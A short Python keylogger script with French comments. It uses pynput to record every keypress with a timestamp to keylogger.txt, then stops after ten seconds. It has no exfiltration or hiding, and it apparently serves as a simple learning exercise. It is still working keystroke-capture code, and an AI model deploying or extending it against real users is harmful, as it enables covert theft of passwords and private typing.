import os, time, threading, logging
from pynput.keyboard import Listener as KeyboardListener

# recupere le chemin à partir d'une variable d'environnement
folder = os.getenv('FOLDER_PATH')

# verifier si le dossier existe, sinon le creer
if folder and not os.path.exists(folder):
    os.mkdir(folder)

# ecrit dans fichier keylogger.txt
logging.basicConfig(
    filename=os.path.join(folder, 'keylogger.txt'),
    filemode="w",
    level=logging.DEBUG,
    format='%(asctime)s - %(message)s\n',
    datefmt='%d/%m/%Y %H:%M:%S'
)


def onPressedListener(keyboard):
    """enregistre chaque touche pressee sur le clavier"""
    logging.info(str(keyboard))

def time_out(listener, periode_sec: int):
    """arrete le keylogger apres un certain delai"""
    time.sleep(periode_sec)
    listener.stop()

def main():
       
    with KeyboardListener(on_press=onPressedListener) as listener:
        thread_time = threading.Thread(target=time_out, args=(listener, 10.0))
        
        thread_time.start()
        listener.join()
    
        

if __name__ == "__main__":
    main()
